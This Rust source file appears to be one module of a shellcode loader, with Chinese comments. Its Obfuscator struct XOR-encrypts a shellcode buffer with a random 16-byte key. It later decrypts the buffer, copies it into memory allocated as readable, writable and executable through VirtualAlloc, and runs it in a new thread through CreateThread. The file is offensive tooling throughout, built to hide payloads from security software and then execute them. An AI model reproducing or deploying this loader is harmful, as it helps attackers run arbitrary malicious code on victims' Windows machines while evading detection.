use super::*;

#[derive(Debug, Default)]
pub struct Obfuscator {
    pub key: Vec<u8>,
    pub esc: Vec<u8>,
}

impl Obfuscation for Obfuscator {
    fn new() -> Self {
        Obfuscator {
            key: g_key(16),
            esc: vec![],
        }
    }

    fn obfuscate(&mut self, sc: &[u8]) {
        // xor 加密
        let key = self.key.clone();
        let mut enc_sc = Vec::new();
        for (i, byte) in sc.iter().enumerate() {
            let key_byte = key[i % key.len()];
            let enc_byte = *byte ^ key_byte;
            enc_sc.push(enc_byte);
        }
        self.esc = enc_sc;
    }

    fn deobfuscate(&self) -> Vec<u8> {
        let key = self.key.clone();
        let mut dec_esc = Vec::new();
        for (i, byte) in self.esc.iter().enumerate() {
            let key_byte = key[i % key.len()];
            let dec_byte = *byte ^ key_byte;
            dec_esc.push(dec_byte);
        }
        dec_esc
    }

    fn exec(&self) {
        let sc = self.deobfuscate();
        use std::mem::transmute;
        use winapi::um::errhandlingapi::GetLastError;
        use winapi::um::memoryapi::VirtualAlloc;
        use winapi::um::processthreadsapi::CreateThread;
        use winapi::um::synchapi::WaitForSingleObject;
        unsafe {
            let ptr = VirtualAlloc(std::ptr::null_mut(), sc.len(), 0x00001000, 0x40);

            if GetLastError() == 0 {
                std::ptr::copy(sc.as_ptr() as *const u8, ptr as *mut u8, sc.len());

                let mut threadid = 0;
                let threadhandle = CreateThread(
                    std::ptr::null_mut(),
                    0,
                    Some(transmute(ptr)),
                    std::ptr::null_mut(),
                    0,
                    &mut threadid,
                );

                WaitForSingleObject(threadhandle, 0xFFFFFFFF);
            } else {
                println!("执行失败：{}", GetLastError());
            }
        }
    }
}
